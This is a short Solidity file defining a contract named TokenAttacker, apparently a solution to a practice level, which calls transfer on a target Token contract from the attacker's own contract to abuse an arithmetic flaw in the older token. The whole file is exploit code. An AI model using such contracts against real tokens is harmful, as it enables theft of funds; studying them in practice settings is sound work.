// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./Token.sol";

contract TokenAttacker {
  using SafeMath for uint256;
  Token target;

  constructor(address _target) public {
    target = Token(_target);
  }


  function attack() public {
    target.transfer(msg.sender, 22);
  }
}

